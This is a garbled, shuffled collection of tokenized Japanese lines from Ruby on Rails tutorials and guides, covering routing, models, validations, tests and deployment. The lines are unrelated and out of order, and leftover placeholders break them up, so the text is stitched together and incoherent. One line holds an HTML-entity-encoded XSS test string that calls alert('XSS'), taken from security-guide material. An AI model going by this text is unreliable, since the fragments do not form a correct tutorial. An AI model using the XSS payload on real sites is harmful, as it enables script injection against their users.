複数 の ファイル に アクセス し た い 場合   ( `app/assets/javascripts/main▖ js` と ` app/assets/javascripts/columns ▖ js ` など )   は 以下 の よう に し ま す 。
2 番 目 の モデル を 追加 する
       create     db /migrate/[timestamp] _create_users ▖ rb
####  ミドルウェア を 削除 する
get   'exit' , to :  'sessions # destroy' ,  as : : logout
リスト \ ref{ code : example _user } で は 、 以下 の よう に Ruby の \ kode {attr_accessor } メソッド を 使用 し ま し た 。
\emph { Ruby   on   Rails チュートリアル } を TV ゲーム に たとえ る と 、 あなた は 主人 公 で あ り 、 各章 を クリア する たび に Rails 開発 者 と し て レベル アップ し て い く と 考え て くださ い
" hello " ▖ from ( 0 )    # =>  " hello "
#### ` parameterize`
まず は 小さな テスト から 書 い て い き ま す 。
`@book ▖ special ? ` が `true ` の 場合 、 Rails は レンダリング を 開始 し 、 `@book ` 変数 を ` special _ show ` ビュー に 転送 し ま す 。
#   If  you   prefer  to  use  mocha ,   flexmock  or   RR ,  # uncomment  the appropriate  line :
       create      app/views/microposts/edit▖html ▖erb
As  mentioned briefly  in   Section   \ ref{ sec : motivation } ,   Rails   defines  a   special  function  to  include  stylesheets,   and
` to_ param ` に よ っ て 返さ れ た 値 を   * * エスケープ し て は いけ ま せ ん * *  ▟ 脆弱 性 が 生 じ ま す 。
#  image_tag ( " icon ▖ png " )
/ users / 1/edit
リファクタリング
どの 呼び出し を 使用 する か は コーディング の スタイル と 規則 の 問題 で しか あ り ま せ ん が 、 経験 上 なるべく シンプル な 記法 を 使用 する 方 が コード が わか り やす く な る で しょ う 。
Ruby で 単一 の テスト を 実行 する こと が でき ま す 。
Rails   用 IDE と し て 最も 有名 な の は \ href { http://www ▖aptana▖ com/rails/}{ RadRails } と \ href { http://www ▖jetbrains ▖ com/ruby/index▖html} { RubyMine } で す 。
Rails に は 、 モデル に 渡 し た データ を 検証 する 機能 も あ り ま す 。
ブロック 内 の コード が 実際 に 書き込 む の は この ファイル で す 。
   validates : password ,  length : { in :   6 ▖ ▖ 20   }
Dependent :   destroy
`bun dle   exec   spring   binstub  -- all ` を 実行 し て binstub を Spring 化 する
###  Asset TagHelper
エンジン が require さ れ る とき に 依存 gem も すぐ に require し た い 場合 は 、 以下 の よう エンジン が 初期 化 さ れ る より 前 に require する 必要 が あ る こと に ご 注意 くださ い 。
上 の コマンド は コントローラ を 作成 し ま し た が 、 同様 に モデル を 作成 する コマンド と し て 、 \ kode { generate  model } が あ り ま す 。
     assoc▖ has_many  : invoices
メール アドレス の フォーマット を 検証 する ため に は 、 次 の よう に \ kode { format } と い う オプション を 使 い ま す 。
そこ で 最初 に 、 Article の show テンプレート   ( `app/views/articles/show ▖html ▖erb ` )   を 改造 し て 新規 コメント を 作成 でき る よう に し ま しょ う 。
*   [ Rails   3   Remote   Links と Forms に つ い て :   決定 版 ガイド ] ( http://www ▖alfajango▖ com/blog / rails - 3 - remote - links- and - forms/ )
テスト に つ い て は [ Rails アプリケーション を テスト する ] ( test ing ▖ html ) を 参照 し て くださ い 。
上 の 例 で は 、 " dear " と い う 文字 で 切り落と さ れ そう に な る ところ を 、 `:separator ` に よ っ て 防 い で い ま す 。
この とき 、 新し い User ページ 用 の 小さな テスト   ( リスト \ ref{ code :user_new_ test } )   も 生成 さ れ て い て 、 この 時点 で は パス する はず で す 。
これ ら の ヘルパー の 動作 は 完全 に 同じ で す ▟ 事前 に 定義 さ れ た カスタマイズ 可能 な パス に エンジン の 機能 の 一部 を マウント し ま す 。
たとえば 、 上 の ルーティング が 以下 の よう に 変更 さ れ た と し ま す 。
####   変換 と 強制
` BigDecimal ` オブジェクト を 文字 で は な く 数字 と し て エンコード する オプション
ここ で は \ kode {toggle ! } メソッド を 使用 し て   \ kode { admin } 属性 の 状態 を \ kode {false } から \ kode {true } に 反転 し て い ま す 。
$ bun dle   exec   rake   test ╼ ActionView:: MissingTemplate :   Missing   template  static _ pages/about
*  `collection▖build ( attributes = {}) `
パスワード の 再 設定 は   Active   Record オブジェクト で は な い が 、 セッション や アカウント 有効 化 の 場合 と 同様 に 、 リソース で モデル 化 でき る 。
これ ら に つ い て 心配 する 必要 は あ り ま せ ん ▟ )
デフォルト は `▖html ` で す 。
http://www ▖example ▖ com/users / 1/edit
Date▖ new (2000 ,   1 ,   31 ) ▖ next _ month # =>  Tue ,   29   Feb   2000
たとえば 、 `/profile ` で は 常 に 「 現在 ログ イン し て い る ユーザー 自身 」 の プロファイル を 表示 し 、 他 の ユーザー id を 参照 する 必要 が な い と し ま す 。
NOTE :   デフォルト で は 、 `: plain ` オプション を 使用 する と 出力 結果 に 現在 の レイアウト が 適用 さ れ ま せ ん 。
` reverse _update ` メソッド は 、 上 で 説明 し た ` reverse_merge ! ` の 別名 で す 。
次 に 、 開発 中 の アプリケーション に 変更 を 反映 する ため に 、 Web サーバー を 再 起動 し ま す
   if  options [ : counter_cache ]  ==   true
次 で 説明 する よう に 、 配列 を 使用 する の が 望まし い 方法 で す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
     resources  :drafts
以下 の よう に ` ActiveRecord : : Base ` クラス の サブ クラス を 作成 する だけ で 完了 し ま す 。
<%=   form _ for  : article ,  url:   article _ path (@ article ) ,   method :  : patch   do  | f| %>
ユーザー \ kode {update } アクション の テスト 。
サイト の ページ の カスタマイズ が 終わ っ て 、 テスト スイート も 軌道 に 乗 っ て き た の で 、 今 の うち に アプリケーション ルート の ルーティング を 設定 し て お き ま しょ う 。
\ kode { destroy } アクション の 保護 の テスト 。
図 \ ref { fig: login_ page _protected_mockup_bootstrap } の よう に 転送 さ せ る 仕組み を 実装 し た い とき は 、 Users コントローラ の 中 で \emph {before フィルター } を 使 い ま す 。
アプリケーション の 名前 を 変更 し て み ま す 。
上 の 場合 、 Rails は `@magazine ` が ` Magazine ` で あ り 、 `@ad ` が ` Ad ` で あ る こと を 認識 し 、 それ に 基づ い て ` magazine_ad _ path ` ヘルパー を 呼び出 し ま す 。
< script   src= "/assets/core ▖ js?
##### ` collection ▖empty?
`many ? ` メソッド は 、 ` collection ▖ size  >   1 ` の 短縮 形 で す 。
上 に よ っ て 以下 が 生成 さ れ ま す 。
###  Delete
Ruby の 世界 で は 、 すべて が オブジェクト で あ る
$  rails  console   -- sandbox
Gravatar は 無料 の サービス で 、 プロファイル 写真 を アップロード し て 、 指定 し た メール アドレス と 関連 付け る こと が でき ま す 。
デフォルト で は 、 この 例外 は 406   Not   Acceptable 応答 と し て 扱 わ れ ま す が 、 この 動作 を オーバーライド する こと が でき ま す 。
ユーザー 認証 が 行 わ れ て い な い 。
ただし 、 読者 から トラブル 報告 が いく つ か 来 て い た の で 、 念 の ため \ kode { heroku run  rake   db : migrate } を 実行 する よう に し て あ り ま す 。
従 っ て 、   ハッシュ に 対 し て \ kode {each } メソッド を 実行 する と 、 ハッシュ の 1 つ の 「 キー と 値 の \emph { ペア } 」 ごと に 処理 を 繰り返 し ま す 。
この フォーム の 各 部分 に つ い て 見 て み ま しょ う 。
アセット パイプライン の 第 一 の 機能 は アセット を 連結 する こと で す ▟ これ に よ り 、 ブラウザ が Web ページ を レンダリング する ため の リクエスト 数 を 減ら す こと が でき ま す 。
A ▖ new▖x   =   1   #   NoMethodError
種類 が ` url ` の 標準 入力 フィールド を 作成 し ま す 。
( ここ で いく つ か 警告 メッセージ が 表示 さ れ る こと が あ り ま す が 、 無視 し て も 構 い ま せ ん ▟ )
最後 に 、 Sublime  Text 上 で 直接 テスト を 実行 する 方法 を 紹介 し ま す ▟ この テクニック は 、 特に Spork と 併用 する と 非常 に 便利 で す 。
先ほど の メソッド を 使 っ て 比較 演算 し て い た 行 を 置き換え る と 、 リスト \ ref{ code :correct _user_before_filter_boolean } に な り ま す 。
\ kode {application ▖js } に Bootstrap の Java Script ライブラリ を 追加 する
ProcessVideoJob ▖ perform_ later ( Video▖ last )
これ は リスト \ ref{ code :initial_ signin_ page } で 使用 さ れ て い ま し た 。
[ ハッシュ 条件 ] ( # ハッシュ を 使用 し た 条件 ) の 場合 、 結合 テーブル で 条件 を 指定 する 場合 に 特殊 な 構文 を 使用 し ま す 。
この ため 、 実際 の PUT リクエスト を 受け取 る API は 今後 も 利用 でき ま す 。
リスト \ ref{ code : sign_in_helper } の とき
Rails   API の 一部 を ドキュメント 化 する 際 に は 、 それ が Rails スタック の ひと つ と な る こと を 意識 し て お く こと が 重要 で す 。
ここ で は 、 Application と い う 名前 の コントローラ の 中 に \ kode {hello } と い う 名前 の アクション を 作成 する こと に し ま す 。
顧客 に よ っ て は HTML フォーマット の メール を 受け取 り た く な い 人 も い る の で 、 テキスト メール も 作成 し て お く の が 最善 で す 。
本番 用 の Web サイト で SSL を 使え る よう に する ため に は 、 ドメイン 毎 に \emph { SSL 証明 書 } を 購入 し 、 セットアップ する 必要 が あ り ま す 。
次 に \ kode {hello\_app } と い う Rails アプリ の 最初 の サンプル 作成 に 取りかか り ま す 。
      <td ><%=  article ▖title %></td>
最後 に 、 システム に よ っ て は 変更 を 反映 する ため に ターミナル 上 で Ctrl - C を 押 し て Web サーバー を 再 起動 する 必要 が 生じ る こと も あ り ま す 。
= > [ " f " ,   " w " ,   " i " ,   " a " ,   " h " ,   " p " ,  " c " ,   " x " ]
       params ▖ require(:comment ) ▖ permit(:commenter ,  : body )
ユーザー 登録 の テスト に アカウント 有効 化 を 追加 する  
    < h 1 > Contacts</ h 1 >
ユーザー 編集 ページ の モックアップ
アクション で 使用 する デフォルト の メイラー ビュー を 変更 する に は 、 たとえば 以下 の よう に し ま す 。
|                     |   101                | :switching _ protocols              |
この ページ は 新規 セッション 用 な の で 、 今 から 作成 する サイン イン ページ を \ kode {app/views/sessions/new▖html ▖erb } に 置 く こと に 注目 くださ い 。
{ 0 } 図 11 ▖ 17 { / 0 }   { 1 } 2 番 目 に 新し い マイクロ ポスト を 削除 し た 後 の ユーザー Home ページ { / 1 }
\ chapter { ゼロ から デプロイ まで } %  ( fold) ╼\ label{ cha : beginning } ╼╼
</select >
###  テスティング の カバレッジ
JSON   Patch は 最近 RFC 化 さ れ た ばかり な の で Ruby ライブラリ は それ ほど あ り ま せ ん 。
def  mid dleware
ブログ アプリケーション を 作成 し た ら 、 その フォルダ 内 に 移動 し ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
Users コントローラ と User モデル の 関係 を さらに 考察 する ため に 、 \ kode { { 1 } リスト 2 ▖ 5 { / 1 }} で { 2 } index{ / 2 } アクション を 整理 し て み ま し た
* `: less_than_or_equal_to`  -   指定 さ れ た 値 と 等し い か 、 それ より も 小さ く な けれ ば な ら な い こと を 指定 し ま す 。
<%=   form_tag ( '/articles ',  remote:  true )   do  %>
#  Use  jquery   as  the   Java Script   library
テスト を 書 く 理由 の ひと つ は 、 今 行 っ た 実装 の エラー を キャッチ でき る よう に する こと で す 。
` http://local host : 3000 / blog ` で エンジン に アクセス する と 、 記事 は 空 の 状態 で す 。
Sat ,   22   Sep  2012   23 : 59 : 59   UTC   + 0 0 : 0 0
  *  エンジン で 使用 する レイアウト ビュー テンプレート
@assembly  = @ part ▖ assemblies ▖find ( 1 )
" SSLError " ▖ un derscore ▖ camelize # =>  " SSLError "
いよいよ 新規 記事 を 投稿 する フォーム を 作成 する こと に し ま しょ う 。
2 番 目 の 引数 で 名前 付き ルート を 渡 し て い る 点 は これ まで と 同じ で す が 、 その 後 に 別 の 引数 が あ り ま す 。
アプリケーション で Cucumber を 使用 する ため の 設定 を 行 う ため に 、 次 は 必要 な サポート 用 ファイル と ディレクトリ を 生成 し ま す 。
% w ( foo  bar  baz ) ▖ sum             # =>  " foobarbaz "
require   'active_ support/core _ext '
` require ` は 、 必要 な ファイル を Sprockets に 指定 する の に 使用 し ま す 。
` config/ database▖yml ` ファイル が あ り 、 環境 変数 ` ENV [ ' DATABASE _ URL '] ` が 設定 さ れ て い な い 場合 は 、 ` config/ database▖yml ` ファイル を 使用 し て データベース 接続 が 行 わ れ ま す 。
この 場合 、 以下 の よう に 設定 し ま す 。
      t▖ text   : body
( この ため \ kode { respond\_to } メソッド は 、 上 から 順 に 実行 する 逐次 処理 と い う より 、 if 文 を 使 っ た 分岐 処理 に 近 い イメージ で す ) 。
パーシャル を 使用 する こと で 、 ビュー 内 の コード を いく つ も の ファイル に 分割 し て 書き出 し 、 他 の テンプレート で も 使いまわ す こと が でき ま す 。
  =>  - 1
*  `rake   doc: guides ` を 実行 する と 、 本 Rails ガイド の 完全 な コピー が アプリケーション の ` doc/guides` フォルダ に 生成 さ れ ま す 。
    <th   colspan = " 3 " ></th >
  # slashes▖ 
カスタム ストア は ` ActionDispatch : : Session : : MyCustomStore ` と し て 定義 する 必要 が あ り ま す 。
Rails は 、 その バージョン が リリース さ れ た 時点 で 最新 の バージョン の Ruby に 依存 し て い ま す 。
# => {" " = > nil ,   " 1 " = > 1 ,  " nested " =>{" a " = > 3 ,   " 5 " = > 5 } }
       create      app/assets/javascripts/users ▖ js▖ coffee
ユーザー の 認証 は 、 パスワード の 送信 、 ハッシュ 化 、 データベース 内 の ハッシュ 化 さ れ た 値 と の 比較 、 と い う 手順 で 進 ん で い き ま す 。
M  =   X : : Y: : Z
\ ref{ sec : augmenting_ the_user_ show _ page } の ユーザー マイクロ ポスト の テンプレート 作成 作業 の 成果 は 、 何 と も 拍子 抜け で し た 。
一緒 に 頑張 り ま しょ う 。
` : polymorphic ` オプション に ` true ` を 指定 する と 、 ポリ モー フィック 関連 付け を 指定 でき ま す 。
*   Rails   4 ▖ 0 の アセット の プリ コンパイル で は 、 ` vendor/assets ` および ` lib/assets ` に あ る 非 JS / CSS アセット を 自動 的 に は コピー し な く な り ま し た 。
//= require   jquery _ ujs
   & # 108 ; & # 101 ; & # 114 ; & # 116 ; & # 40 ; & # 39 ; & # 88 ; & # 83 ; & # 83 ; & # 39 ; & # 41 ; >
テキスト エディタ で ` app/views/welcome/index▖html ▖erb ` を 開 い て み ま しょ う 。
< script>
select_datetime( )
メール アドレス を ユーザー 名 に し た こと で 、 ユーザー 同士 で 通信 でき る よう に 拡張 でき る 可能 性 が 開 か れ ま す   ( 第 \ ref { cha : account_activation_and _ password _ reset } ) 章 ) 。
#   < contributor >
    <td ><%=  b %></td>
簡潔 さ は それ だけ で 長所 に な り ま す 。
    options   = args ▖ extract _options !
この 配置 さ れ た テンプレート で 、 関数 の 引数 に ダイジェスト 名 を 追加 し て この メソッド を 一般 化 し 、 続 い て 上 の よう に 文字 列 の 式 展開 を 使用 し ま す 。
保存 に 失敗 し た 場合 は 、 単に \ ref{ sec : signup _failure } で 開発 し た とおり の 動作 が 実行 { さ れ ま す 。
と は い え 、 一般 的 な アルファベット など を 使 っ て い る 限り に お い て は 、 シンボル で 困 る こと は な い で しょ う 。
リスト { p 0 } の { 2 } hello{ / 2 } アクション を 書き換え 、 「 hola ,  mundo ! 」 と 表示 さ れ る よう に し て み ま しょ う
   content_type:  " text /plain " ,
今度 は アプリケーション に 第 2 の モデル を 追加 し ま しょ う 。
\ ref{ sec : development_environment } で 紹介 し た Cloud   IDE で は 、 デフォルト で この よう な 行 が 含 ま れ ま す 。
テスト に パス する Home ページ 用 コード 。
    has_many  : invoices ,   dependent :  : destroy
上 で 示 し た パターン に 則 っ て 、 flash 変数 の 内容 を Web サイト 全体 に わた っ て 表示 でき る よう に する と 、 次 の よう な コード に な り ま す 。
リレーションシップ と い う パズル の 最後 の 一 片 は 、 \ kode {user ▖ followers } メソッド を 追加 する こと で す ▟ これ は 上 の \ kode {user ▖ followed_users } メソッド と 対 に な り ま す 。
root  to :  ' pages #main'
コード に 貢献 する に は 、 まず Rails リポジトリ を クローン する ところ から 始め る 必要 が あ り ま す 。
作成 し た コード を リスト \ ref{ code :remember_ method } に 示 し ま す
これ は リスト \ ref{ code : password _ reset_update_action } で 使用 さ れ て い ま し た 。
class   Products Controller <  Application Controller
以上 の 説明 で 動作 が 明らか に な り ま し た ▟ 接続 情報 は 絶対 に database▖yml に 直接 書 か ず 、 常 に ` ENV [ ' DATABASE _ URL '] ` に 保存 し た もの を 利用 し て くださ い 。
NoMethodError :  undefined   method ` to_ a'  for   9 : Fixnum
assemblies ( force_ reload   =  false )
この フォーマット は 、 Active   Record で 条件 の 値 の 範囲 を サポート する とき に 使用 さ れ て い ま す 。
オブジェクト 指向 プログラミング の 経験 が な い 方 に と っ て は 何 の こと だ か わか ら な い と 思 い ま す の で 、 いく つ か の 具体 例 を 示 す こと に し ま す 。
*  `collection ▖ create ( attributes = {}) `
╼\end{ code }╼╼    \ subsection { 基本 的 な モデル } %  ( fold) ╼    \ label{ sec : the_ basic _ model} ╼╼
ユーザー が この チェック ボックス を オフ する と 、 すべて の コンピュータ 上 の すべて の ブラウザ から ログ アウト し ま す の で 、 注意 が 必要 で す 。
それ で は サンプル アプリケーション の About ページ の 作成 に 取りかか り ま す 。
       create    app/models/micropost ▖ rb
Client ▖ joins(:orders) ▖ w here (orders: {  created_at: time_range   } )
まだ テキスト を 書 い ただけ な の で 、 当然 ながら この まま で は Cucumber の シナリオ は テスト に パス し ま せ ん 。
= >   BasicObject
*   その ルーティング で 使用 する パラメータ
上 の フィーチャー ファイル の コード は 、 ステップ ファイル で は 以下 の よう に 扱 わ れ ま す 。
これ は 、 以下 の コード で は
この ドメイン 特化 言語 の 文法 は シンプル で 、 必要 な オブジェクト の 属性 を 定義 する ため に Ruby の ブロック と カスタム メソッド を 使用 し て い ま す 。
詳細 に つ い て は [ Rosario   Valotta ' の 論文 ] ( http://www ▖xssed ▖ com/news/37 / Nduja_ Connection_A_cross _ webmail _worm _XWW/ ) を 参照 し て くださ い 。
モデル の ファイル の 他 に マイグレーション ファイル も 生成 さ れ て い ま す ▟ マイグレーション ファイル は 、 モデル に 対応 する データベース テーブル を 生成 する ため に 使用 さ れ ま す 。
   class  B
この 時点 で ブラウザ で < http://local host : 3000/articles/new > を 表示 する と 、 記事 の 作成 が   * ほぼ *   可能 な 状態 に な っ て い ま す 。
` create ` アクション の 役割 は 、 記事 を データベース に 保存 する こと で す 。
   validates : token ,   presence :  true ,  uniqueness:  true ,   strict :   TokenGenerationException
キー が 衝突 し た 場合 、 引数 の ハッシュ の キー が ` merge ` で は 優先 さ れ ま す 。
この コード は 、 各 ページ の 内容 を レイアウト に 挿入 する ため の もの で す 。
作成 し た コード を リスト \ ref{ code :microposts_destroy _ action } に 示 し ま す
この モード で は 、 パイプライン の アセット へ の リクエスト は 直接 Sprockets に よ っ て 扱 わ れ ま す 。
さらに 、 削除 さ れ た オブジェクト は 、 以下 の よう に まだ メモリ 上 に 残 っ て い ま す 。
ブラウザ の < http://local host : 3000/articles/new > を 再 表示 する と 、 今度 は 別 の エラー が 表示 さ れ ま す 。
カスタム セッション ストア を 指定 する こと も でき ま す 。
Ruby を インストール する 前 に 、 以下 を 実行 し て \ href { http://rvm▖io /rvm/install/ }{ RVM } を インストール し ま す 。
<%=   javascript_ include_tag   " application " ,   " data-turbolinks - track "  => true   %>
これ は リスト \ ref{ code : from _users _ followed_ by _ first _cut } で 使用 さ れ て い ま し た 。
この メソッド は 、 引数 に 与え られ た 文字 列   ( パスワード )   を ハッシュ 化 し た 値 と 、 データベース 内 に あ る \ kode { password_digest } カラム の 値 を 比較 し ま す 。
     isolate_namespace   Blorgh
Active   Support が 提供 する ` to_json ` メソッド の 実装 は 、 通常 ` json `   gem が Ruby オブジェクト に 対 し て 提供 し て い る ` to_json ` より も 優れ て い ま す 。
論理 値 を と る \ kode { admin } 属性 が 追加 さ れ た User モデル
元 に 戻 す 方法
Client ▖find_or_create_by ( first _ name : ' Andy')   do  | c|
#### ` has_many ` の オプション
記入 済み の ` < form > ` を 得 られ た だけ で は 何 か 物 足 り ま せ ん 。
また 、 Rails   の 教育 エコシステム に 存在 する 、 さらに 高度 な 内容 の 本 や ブログ 、 スクリーン キャスト など を 読み解 く 力 も 身 に つけ られ る で しょ う 。
正し く インストール さ れ て い る こと 、 PATH 環境 変数 が 正し く 通 っ て い る こと を 確認 し て くださ い 。
Git   remote   heroku  added
` app/assets/javascripts ` に 置 か れ て い る Java Script アセット へ の パス を 算出 し ま す 。
gem の インストール 完了 後 、 `<%=  console %>` など の コンソール ヘルパー へ の 参照 を ビュー に 追加 する だけ で 、 どの ビュー で も コンソール を 利用 でき る よう に な り ま す 。
( 執筆 予定 )
COM  THE _ US - ER@ foo▖ bar▖org   first ▖ last @ foo▖ jp]
[ remember   me ]   チェック ボックス の テスト  
<%=   link_to   " New book " ,   new_book _ path %>
この 値 は メール ごと に 上書き する こと も でき ま す 。
###  バリデーション の 条件 を 結合 する
デフォルト の エラー メッセージ は 複数 形 で 表現 さ れ て い る こと に ご 注意 くださ い   ( 例 :  " is   too  short  ( minimum   is  %{ count }   characters) " ) 。
email
Rails で は 、 メモリ を 圧迫 し な い サイズ に バッチ を 分割 し て 処理 する ため の 方法 を 2 とおり 提供 し て い ま す 。
この ヘルパー は 、 指定 さ れ た 属性 が 空 で な い こと を 確認 し ま す 。
    <ul >
      : videojobs
上 の コマンド の 最初 の 引数 は マイグレーション 名 、 次 の 引数 は 作成 する 属性 の 名前 と 型 で す
     message:   " 英 文字 のみ が 使用 でき ま す "   }
パーシャル に ローカル 変数 を 引数 と し て 渡 し 、 パーシャル を さらに 強力 かつ 柔軟 に する こと も でき ま す 。
Person ▖ create ( name : nil ) ▖ valid ?  
ここ で 、 ` isolate_namespace ` メソッド に つ い て 特別 な 注意 が 必要 で す 。
もちろん 、 実際 に ブラウザ を 起動 し て 、 テスト が 正し く 動 い て い る か どう か を 確かめ る こと も でき ま す   ( 図 \ ref { fig:about _us } ) 。
フラッシュ メッセージ が 消え な い 問題 は 、 この アプリケーション の 小さな バグ で す 。
以前 の バージョン の Rails で は 、 以下 の コード は
セキュリティ が 最 重要 課題 で あ れ ば 、 セキュリティ モデル で エラー が 発生 し た 場合 の テスト を 最初 に 書 く べ き 。
{ " action "  => " create " ,  " controller "  =>  " people " ,   " person "  => { " first _ name "  =>  " William " ,   " last_ name "  => " Smith " } }
       create    app/assets/stylesheets/scaffolds ▖css ▖ scss
全て の 準備 が 整 っ た 今 、 ユーザー が 短 い メッセージ を 投稿 でき る よう に する ため の リソース 「 \emph { マイクロ ポスト } 」 を 追加 し て い き ま す
*   値 が 呼び出し 可能 な   ( callable )   オブジェクト の 場合 、 引数 が 1 つ また は 2 つ 必要 で す 。
次 に 、 \ href {https://github▖ com/minimagick / minimagick } {Mini Magick } と い う gem を 使 っ て 、 CarrierWave から Image Magick を 使え る よう に し ま す 。
ユーザー や マイクロ ポスト など に 関 し て は 自然 に リソース 化 でき る の で 問題 あ り ま せ ん 。
自分 の 変更 が どちら に 該当 する か わか ら な い 場合 は 、 余分 な 作業 を せ ず に 済 む ため に も 、 変更 を バック ポート する 前 に Rails チーム の メンバー に ご 相談 くださ い 。
これ を 行な う に は 、 comment モデル と comments コントローラ を 生成 し 、 articles   scaffold を 変更 し て コメント を 表示 でき る よう に し 、 それ から 新規 コメント を 作成 でき る よう に し ま す 。
ある リソース の 「 単数 形 の フォーム 」 を 定義 し た い 場合 、 ` Inflector ` に 活用 形 ルール を 追加 し ま す 。
上 の 設定 は あくまで オ ススメ な の で 、 リスト \ ref{ code :irbrc } を 追加 し な く て も 、 以下 の よう に Rails コンソール を 開始 でき ま す 。
Client▖unscoped▖load
#   If  you   change  this  key ,   all  old  signed cookies will   become invalid !
\ kode {email } 属性 の 存在 性 の テスト 。
▖ gitignore
M ▖ parents       # => [ X : : Y ,   X ,  Object ]
この コード を 再度 実行 する と 、 この ブロック は 実行 さ れ ま せ ん 。
<%=   asset_path ( 'smile▖ png ')  %>
password _field_tag  ' pass'
Linux   の 場合 、 デフォルト の ターミナル で 問題 あ り ま せ ん 。
間違 っ た パスワード を 与え た 結果 、 \ kode {user ▖ authenticate } が \ kode {false } を 返 し た こと が わか り ま す 。
これ は リスト \ ref{ code :annotated_title_helper } で 使用 さ れ て い ま し た 。
" User " ▖ foreign_key ( false )  # =>  " userid "
###  comments リソース を 生成 する
ちなみ に 、 ここ に flash の テスト も 追加 し て お く と よ い で しょ う ▟ これ は 演習 と し て 残 し て お き ま す   ( \ ref{ sec : exercises_the_flash} ) 。
News ビュー で 新し い レイアウト が 使用 さ れ る よう に な り 、 トップ メニュー が 隠 さ れ て " content "   div タグ 内 に 右 メニュー が 新し く 追加 さ れ ま し た 。
\ label{ fig: bitbucket_repository _ page }}╼\end { figure} ╼╼╼    \ subsection { ブランチ   ( branch ) 、 変更   ( edit ) 、   コミット   ( commit ) 、 マージ   ( merge) }╼    \ label{ sec : git_ commands }╼╼
ren der   action :  :edit
いよいよ CRUD の D まで 到達 し ま し た ▟ ここ で は 記事 を データベース から 削除 し ま す 。
その おかげ で 、 ` except ` メソッド は たとえば with _indifferent_access など で 期待 どおり に 動作 し ま す 。
新し い Web サーバ を 追加 する ため に 、 \ href {https://devcenter ▖ heroku▖ com/articles/rails - Puma} { Heroku 内 の Puma ドキュメント }   ( 英語 )   に したが っ て セットアップ し て い き ま す 。
Cloud   IDE や Unix 系 の OS   ( Max   OS   X など )   を 使 っ て い る 場合 は 、 次 の よう に \ kode { curl} コマンド で 簡単 に 取得 でき ま す
使用 さ れ る パーシャル 名 は 、 コレクション の 中 に あ る 「 モデル 名 」 を 参照 し て 決定 さ れ ま す ▟ この 場合 の モデル 名 は ` Product ` で す 。
*  `config▖ active_ support▖escape_html_entities_ in_json ` は 、 JSON シリアライズ に 含 ま れ る HTML エンティティ を エスケープ する か どう か を 指定 し ま す 。
GRO UP   BY status
この チェック は ` require   'rails/test _help'` の 際 に 自動 的 に 行 わ れ る よう に な り ま し た ▟ この 呼び出し を 削除 し な く て も 悪 影響 が 生じ る こと は あ り ま せ ん 。
日時 に 対 し て 期間 を 加減算 でき ま す 。
{ 0 } 図 7 ▖ 1 { / 0 } { 1 } この 節 で 作成 する ユーザー プロファイル の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/profile_mockup_profile_name_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
    <th > Text < / th >
サンプル アプリケーション の 今後 の 開発 で は 、 その さらに 簡潔 な スタイル を 可能 な 限り 使用 する こと に し ま す 。
*   [ re SRC が 選 ぶ 無料 の プログラミング 学習 用 書籍 一覧   ( 英語 ) ] ( http://resrc▖io / list/10 / list - of - free - programming - books/#ruby )
これ に つ い て は 本 ガイド で 後述 し ま す 。
前者 の 疑問 符 を 使用 し た 文法 も 便利 で す が 、 \emph { 同じ } 変数 を 複数 の 場所 に 挿入 し た い 場合 は 、 後者 の 置き換え 後 の 文法 を 使用 する の が より 便利 で す 。
|   ミドルウェア               |  役割                                                                             |
セキュア な パスワード の 実装 は 、 \ kode { has_ secure_ password } と い う Rails の メソッド を 呼び出 す だけ で ほとんど 終わ っ て しま い ま す ▟ この メソッド は 、 User モデル で 次 の よう に 呼び出せ ま す 。
{ 0 } 図 12 ▖ 23 : {/ 0 }   { 1 } Home ページ で 動作 する ステータス フィード { / 1 }
レシーバ が ` convert_key ` に 応答 する 場合 、 この メソッド は すべて の 引数 に 対 し て 呼び出 さ れ ま す 。
       create      app/views/microposts
###  Ruby の バージョン
# => {: a = > 0 ,  : b = > 1 ,  : c = > 2 }
執筆 時点 で は 、 デフォルト で な い フォーマット と し て サポート さ れ て い る の は ` : db ` のみ で す 。
この ため 、 上 を コンソール で 実行 する と \ kode { NoMethodError } 例外 が 発生 し ま す 。
  *   引数 に   ( 英語 の )   活用 ルール を 適用 し ま す ( inflection ) 。
<target  option = " fast "   name =" compile "  />
第 \ ref { cha : sign_up } 章 で は 、 ユーザー が サイト に ユーザー 登録 でき る よう に し 、 ユーザー プロファイル の ため の ページ を 作成 し ま す 。
すべて の マイクロ ポスト を 表示 する ページ
ローカル コンピュータ で Rails サーバー を 実行 する 。
Rails は デフォルト で は すべて の カラム を 取り出 し ま す 。
( 実際 に は 少し 余裕 を 持 た せ て 78 列 に し て あ り ま す )   。
Article ▖many?
フォーム を 追加 する に は 、 ` app/views/blorgh/articles/show ▖html ▖erb ` の `ren der @ article ▖ comments ` 呼び出し の 直後 に 以下 の 行 を 追加 し ま す 。
   alert  " page   has  loaded ! "
継承 階層 を { 0 } { 1 } 図 4 ▖ 1 { / 1 } { / 0 } に 示 し ま す 。
*  `config▖ action_view▖erb _trim_mode ` は 、 ERB で 使用 する トリム モード を 指定 し ま す 。
アプリケーション の 開発 時 に のみ 必要 と な る gem の インストール を 指定 する に は 、 以下 の よう に 記述 し ま す 。
上 の 関連 付け に 対応 する マイグレーション は 以下 の よう な 感じ に な り ま す 。
*   `updated_at` -   レコード が 更新 さ れ た とき に 現在 の 日付 時刻 が 自動 的 に 設定 さ れ ま す
####  お すすめ の 方法
好み に 応 じ て 、 ドキュメント ルート から の 相対 フル パス や URL を 指定 する こと も でき ま す 。
最後 の 図 \ ref { fig :user_profile_microposts } で は 、 最初 の ユーザー の \emph { 2 番 目 } の ページ と 、 下部 に あ る ページ ネーション の リンク を 表示 し て い ま す 。
|                     |  410               | : gone                             |
1 クリック で 削除 でき る 記事 の 一覧 が あ る と し ま す 。
Active   Record で は 、 データベース から オブジェクト を 取り出 す ため の 検索 メソッド を 多数 用意 し て い ま す 。
   belongs_to : comment
If  you
Follow/Unfollow ボタン を テスト する 。
しかし 、 執筆 当時 の 最新 バージョン で あ る 3 ▖ 0 ▖ 4 まで の RedCloth は XSS に 関 し て も 脆弱 で し た 。
self を 省略 し た 結果 を リスト \ ref{ code :bootstrap_config } に 示 し ま す 。
